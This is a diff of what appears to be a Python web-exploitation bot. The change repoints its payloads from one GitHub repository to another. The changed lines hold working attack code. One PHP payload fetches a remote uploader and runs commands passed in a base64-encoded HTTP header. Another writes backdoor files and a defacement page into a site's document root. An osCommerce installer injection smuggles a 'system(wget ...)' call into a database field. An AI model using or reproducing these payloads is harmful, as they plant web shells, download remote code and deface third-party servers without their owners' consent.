@@ -85,12 +85,12 @@ indecx = "Files/spy.html"
 filevid = "Files/mah.PhP.txt"
 indexxx = "Files/spy.txt"
 louis = "Files/up.php"
-payloadz = "<?php error_reporting(0);print(system('wget https://raw.githubusercontent.com/MisterSpyx/Mister-Spy-Bot-V4/master/v4rdp/up.php'));passthru(base64_decode($_SERVER[HTTP_CMD]));die; ?>"
+payloadz = "<?php error_reporting(0);print(system('wget https://raw.githubusercontent.com/ivi2020/test/master/M7/Files/up.php'));passthru(base64_decode($_SERVER[HTTP_CMD]));die; ?>"
 com_jdownloads = 'Files/up.php3.g'
 com_jdownloads_index = 'Files/pwn.gif'
 Agent = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
 user_agent = "Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A334 Safari/7534.48.3"
-payload = """  fwrite(fopen($_SERVER['DOCUMENT_ROOT'].'/Manager.php','w+'),file_get_contents('https://raw.githubusercontent.com/MisterSpyx/Mister-Spy-Bot-V4/master/v4rdp/up.php')); fwrite(fopen($_SERVER['DOCUMENT_ROOT']."/libraries/respectMuslims.php","w+"),file_get_contents("https://raw.githubusercontent.com/MisterSpyx/Mister-Spy-Bot-V4/master/v4rdp/up.php"));fwrite(fopen($_SERVER['DOCUMENT_ROOT'].'/Fuckedz.htm','w+'),' Vulnerability! Fuckedz By En Banglasia! ');"""
+payload = """  fwrite(fopen($_SERVER['DOCUMENT_ROOT'].'/Manager.php','w+'),file_get_contents('https://raw.githubusercontent.com/ivi2020/test/master/M7/Files/up.php')); fwrite(fopen($_SERVER['DOCUMENT_ROOT']."/libraries/respectMuslims.php","w+"),file_get_contents("https://raw.githubusercontent.com/ivi2020/test/master/M7/Files/up.php"));fwrite(fopen($_SERVER['DOCUMENT_ROOT'].'/Fuckedz.htm','w+'),' Vulnerability! Fuckedz By En Banglasia! ');"""
 filenames = "Files/up.php"
 def rand_str (len = None) :
 	if len == None :
@@ -5944,7 +5944,7 @@ def osrce(url):
 			Exp = url + '/install/install.php?step=4'
 			data = {'DIR_FS_DOCUMENT_ROOT': './'}
 			shell = '\');'
-			shell += 'system("wget https://raw.githubusercontent.com/MisterSpyx/Mister-Spy-Bot-V4/master/v4rdp/up.php");'
+			shell += 'system("wget https://raw.githubusercontent.com/ivi2020/test/master/M7/Files/up.php");'
 			shell += '/*'
 			data['DB_DATABASE'] = shell
 			zonn = requests.post(Exp, data=data)
